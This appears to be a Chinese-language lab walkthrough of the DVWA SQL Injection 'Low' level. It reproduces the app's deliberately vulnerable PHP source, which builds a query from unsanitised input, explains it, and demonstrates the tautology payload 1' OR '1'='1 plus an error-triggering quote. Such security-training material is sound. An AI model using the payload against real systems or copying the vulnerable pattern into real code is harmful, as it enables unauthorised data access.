---
title: SQL Injection
data: 2026-04-23
draft: fales
weight: 9
tags: ["SQL注入", "注入"]
---

# 一、Low
## 1.1 源码
```PHP
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Get values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            mysqli_close($GLOBALS["___mysqli_ston"]);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);
            #$sqlite_db_connection->enableExceptions(true);

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    } 
}

?>
```
- `$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`从`users`表中，查询`user_id`等于用户输入`$id`的用户姓名。
- `$id`被单引号`'`包裹，这是字符型SQL注入的标志。
- `$result = mysqli_query(连接, SQL语句) or die(错误信息);`，SQL查询成功将结果存到`$result`，查询失败，停止程序，并打印错误
- `mysqli_query($GLOBALS["___mysqli_ston"], $query)`，`mysqli_query`PHP专门执行MySQL语句的函数，`$GLOBALS["___mysqli_ston"]`DVWA提前建好的数据库连接，`$query`有注入漏洞的那行拼接好的SQL语句
```PHP
((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false))

如果（数据库连接是有效的）{
    输出 → SQL执行的语法错误（比如注入导致的SQL写错了）
} else {
    输出 → 数据库连不上的错误
}
```


## 1.2 攻击
`1' OR '1' = '1`
`SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';`
永远为真，查询所有用户数据
![](images/1.png)
输入`1'`，报错如下图
![](images/2.png)
